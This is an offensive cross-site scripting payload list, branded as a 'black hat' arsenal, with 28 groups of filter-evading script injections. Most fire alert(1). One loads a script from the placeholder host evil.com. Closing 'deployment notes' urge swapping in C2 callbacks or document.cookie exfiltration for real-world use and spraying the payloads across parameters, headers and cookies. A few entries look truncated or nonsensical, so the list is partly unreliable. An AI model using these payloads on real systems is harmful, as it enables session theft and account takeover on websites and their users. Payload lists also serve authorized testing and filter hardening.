# XSS UNIVERSAL PAYLOAD BATTERY - BlackHatJakk + Custom Arsenal

# 1. Obfuscated Script Injection (Hex/Unicode)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script%2fx="1"%2f%2a%2fx%3d1%2f%2a%2fsrc%3d1%2fonerror%3dalert(1)%3e
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script\x0a\x2fonload\x3dalert(1)\x3e

# 2. Event Handler + SVG Bypass (HTML5)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<svg/onload=alert(1)>
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<svg><script>alert(1)</script>

# 3. Polyglot JavaScript URIs
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"><img src=x onerror="this.onerror=null;location='javascript:alert(1)'">
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"><iframe srcdoc="<script>alert`1`</script>">

# 4. Obfuscated/Polyglot – Anti-Filter
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<SvG OnLoAd=/*-/*`/*\*/alert(1)//">
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<scr<script>ipt>alert(1)</scr</script>ipt>

# 5. Long Variable Chain Fuzzer
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script>var aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=alert;a(1)</script>

# 6. DOM Clobbering / Prototype Pollution
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<input name="constructor"><form id="f" onforminput="alert(1)">

# 7. Obfuscated via JS String Construction
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

# 8. No Script Tag, DOM-based
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<img src=x onerror="alert(1)">
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" accesskey="x" onclick="alert(1)"

# 9. Bypass HTML Entities / Nested Decoding
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

# 10. HTML5/JS Context Switch Polyglot
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<details open ontoggle=alert(1)>
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<math href="javascript:alert(1)"></math>

# 11. Base64 Injection via Data URI
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>

# 12. XSS via Uncommon Tags
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<marquee onstart=alert(1)>
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<isindex type="image" src="1" onerror="alert(1)">

# 13. Image with srcset (often overlooked)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<img src=x srcset=1 onerror=alert(1)>

# 14. Obfuscated using JS Math
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script>(([]+[])[+!![]]+[])[1]+alert(1)</script>

# 15. Exotic Encodings
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script>alert`1`</script>
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script>/*<![CDATA[*/alert(1)//]]></script>

# 16. Template Injection XSS
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{constructor.constructor('alert(1)')()}}
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<%= alert(1) %>

# 17. Onmouseover / Non-Onload Event
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<div style="position:absolute;top:0;left:0;width:100vw;height:100vh" onmouseover=alert(1)>X</div>

# 18. CSS Injection → JS
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"><style>*{background:url('javascript:alert(1)')}</style>

# 19. Meta Refresh to JS
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

# 20. Form Action XSS
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<form action="javascript:alert(1)"><input type=submit></form>

# 21. iframe + srcdoc + meta CSP bypass (HTML5)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<iframe srcdoc="<script src=//evil.com/x.js></script>"></iframe>

# 22. Onanimationstart/Onfocus—Rarely Filtered
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<div style=animation-name:spin onanimationstart=alert(1) tabindex=1></div>
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<input autofocus onfocus=alert(1)>

# 23. No Quotes Attribute
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<img src=x onerror=alert(1)>
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<svg/onload=alert(1)>

# 24. JS Protocol in HREF (bypasses with custom wrappers)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<a href="javascript:alert(1)">CLICKME</a>

# 25. XSS via innerHTML (JS context)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<svg><script>window </script>

# 26. Multi-layer Obfuscation / JS Encoding
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script>setTimeout('\x61\x6c\x65\x72\x74\x28\x31\x29', 1)</script>

# 27. Bypass using Encoded Newlines
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script
>alert(1)</script>

# 28. SVG Animate Tag
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<svg><animate onbegin=alert(1) attributeName=x></svg>

# End of List

# Deployment Notes:
# - Replace alert(1) with your C2 or document.cookie exfil for real-world use
# - Fuzz prefix length for extra bypass (aaaaaaaa...)
# - Use in params, body, headers, or cookies to maximize vuln discovery

